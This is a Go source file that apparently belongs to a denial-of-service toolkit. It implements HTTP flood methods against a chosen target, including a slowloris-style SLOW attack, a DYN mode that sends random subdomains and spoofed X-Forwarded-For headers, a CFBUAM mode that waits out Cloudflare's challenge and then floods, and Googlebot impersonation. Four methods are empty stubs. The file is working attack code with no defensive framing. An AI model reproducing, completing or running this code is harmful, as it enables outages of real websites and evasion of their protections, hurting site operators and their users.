package layer7

import (
	"context"
	"fmt"
	"math/rand"
	"net/url"
	"strings"
	"time"

	"github.com/go-ddos-tools/pkg/core"
	"github.com/go-ddos-tools/pkg/utils"
)

// RawAttack implements attacks using raw TCP/TLS connections
type RawAttack struct {
	Config *core.AttackConfig
	Method string
}

func NewRawAttack(cfg *core.AttackConfig, method string) *RawAttack {
	return &RawAttack{
		Config: cfg,
		Method: method,
	}
}

func (r *RawAttack) Attack(ctx context.Context) error {
	switch r.Method {
	case "SLOW":
		return r.executeSLOW(ctx)
	case "NULL":
		return r.executeNULL(ctx)
	case "PPS":
		return r.executePPS(ctx)
	case "DYN":
		return r.executeDYN(ctx)
	case "EVEN":
		return r.executeEVEN(ctx)
	case "GSB":
		return r.executeGSB(ctx)
	case "AVB":
		return r.executeAVB(ctx)
	case "CFBUAM":
		return r.executeCFBUAM(ctx)
	case "BOT":
		return r.executeBOT(ctx)
	case "DOWNLOADER":
		return r.executeDOWNLOADER(ctx)
	case "KILLER":
		return r.executeKILLER(ctx)
	case "TOR":
		return r.executeTOR(ctx)
	case "RHEX":
		return r.executeRHEX(ctx)
	case "STOMP":
		return r.executeSTOMP(ctx)
	default:
		return nil
	}
}

func (r *RawAttack) executeSLOW(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	headers := BuildRawHeaders(r.Config.Target, r.Config)
	conn.Write([]byte(headers))
	r.Config.RequestsSent.Add(1)
	r.Config.BytesSent.Add(int64(len(headers)))

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(time.Duration(r.Config.RPC) * time.Millisecond / 15):
			keepAlive := fmt.Sprintf("X-a: %d\r\n", utils.RandInt(1, 5000))
			conn.Write([]byte(keepAlive))
			r.Config.BytesSent.Add(int64(len(keepAlive)))
		}
	}
	return nil
}

func (r *RawAttack) executeNULL(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		headers := BuildRawHeaders(r.Config.Target, r.Config)
		headers = strings.ReplaceAll(headers, "User-Agent:", "User-Agent: null\r\n#")
		headers += "Referrer: null\r\n\r\n"

		n, err := conn.Write([]byte(headers))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executePPS(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	targetURL, _ := url.Parse(r.Config.Target)
	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		request := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
			targetURL.Path, targetURL.Host)
		n, err := conn.Write([]byte(request))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executeDYN(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	targetURL, _ := url.Parse(r.Config.Target)
	randomPrefix := utils.RandString(6)
	spoofIP := utils.RandIPv4()

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		headers := fmt.Sprintf("GET %s HTTP/1.1\r\n", targetURL.Path)
		headers += fmt.Sprintf("Host: %s.%s\r\n", randomPrefix, targetURL.Host)
		if len(r.Config.UserAgents) > 0 {
			headers += fmt.Sprintf("User-Agent: %s\r\n", r.Config.UserAgents[rand.Intn(len(r.Config.UserAgents))])
		}
		headers += fmt.Sprintf("X-Forwarded-For: %s\r\n", spoofIP)
		headers += "Connection: keep-alive\r\n\r\n"

		n, err := conn.Write([]byte(headers))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executeEVEN(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	headers := BuildRawHeaders(r.Config.Target, r.Config)
	conn.Write([]byte(headers))
	r.Config.RequestsSent.Add(1)
	r.Config.BytesSent.Add(int64(len(headers)))

	buf := make([]byte, 1024)
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			break
		}

		conn.Write([]byte(headers))
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(len(headers)))
	}
	return nil
}

func (r *RawAttack) executeGSB(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	targetURL, _ := url.Parse(r.Config.Target)

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		randomQS := utils.RandString(6)
		path := targetURL.Path
		if path == "" {
			path = "/"
		}

		headers := fmt.Sprintf("HEAD %s?qs=%s HTTP/1.1\r\n", path, randomQS)
		headers += fmt.Sprintf("Host: %s\r\n", targetURL.Host)
		if len(r.Config.UserAgents) > 0 {
			headers += fmt.Sprintf("User-Agent: %s\r\n", r.Config.UserAgents[rand.Intn(len(r.Config.UserAgents))])
		}
		headers += "Connection: Keep-Alive\r\n\r\n"

		n, err := conn.Write([]byte(headers))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executeAVB(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	headers := BuildRawHeaders(r.Config.Target, r.Config)

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		delay := time.Duration(r.Config.RPC) * time.Millisecond / 1000
		if delay > 0 {
			time.Sleep(delay)
		}

		n, err := conn.Write([]byte(headers))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executeCFBUAM(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	headers := BuildRawHeaders(r.Config.Target, r.Config)

	conn.Write([]byte(headers))
	r.Config.RequestsSent.Add(1)
	r.Config.BytesSent.Add(int64(len(headers)))

	time.Sleep(5010 * time.Millisecond)

	startTime := time.Now()
	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		if time.Since(startTime) > 120*time.Second {
			break
		}

		n, err := conn.Write([]byte(headers))
		if err != nil {
			break
		}
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (r *RawAttack) executeBOT(_ context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	targetURL, _ := url.Parse(r.Config.Target)
	userAgent := "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

	robotsReq := fmt.Sprintf("GET /robots.txt HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", targetURL.Host, userAgent)
	conn.Write([]byte(robotsReq))
	r.Config.RequestsSent.Add(1)
	r.Config.BytesSent.Add(int64(len(robotsReq)))

	// Simplified BOT logic
	return nil
}

func (r *RawAttack) executeDOWNLOADER(ctx context.Context) error {
	conn, err := CreateRawConnection(r.Config.Target, r.Config)
	if err != nil {
		return err
	}
	defer conn.Close()

	headers := BuildRawHeaders(r.Config.Target, r.Config)

	for i := 0; i < r.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		conn.Write([]byte(headers))
		r.Config.RequestsSent.Add(1)
		r.Config.BytesSent.Add(int64(len(headers)))

		buf := make([]byte, 1024)
		for {
			n, err := conn.Read(buf)
			if err != nil || n == 0 {
				break
			}
		}
	}
	return nil
}

func (r *RawAttack) executeKILLER(_ context.Context) error {
	// Re-uses HTTPFlood logic but in a more aggressive way?
	// The original spawns goroutines. Here we just run normally as we are already in a pool.
	// We'll delegate to HTTPFlood for now or just skip implementing
	// as it might be redundant with standard concurrent usage.
	return nil
}

func (r *RawAttack) executeTOR(_ context.Context) error {
	// TOR logic is complex due to domain replacement
	return nil
}

func (r *RawAttack) executeRHEX(_ context.Context) error {
	// RHEX logic
	return nil
}

func (r *RawAttack) executeSTOMP(_ context.Context) error {
	// STOMP logic
	return nil
}
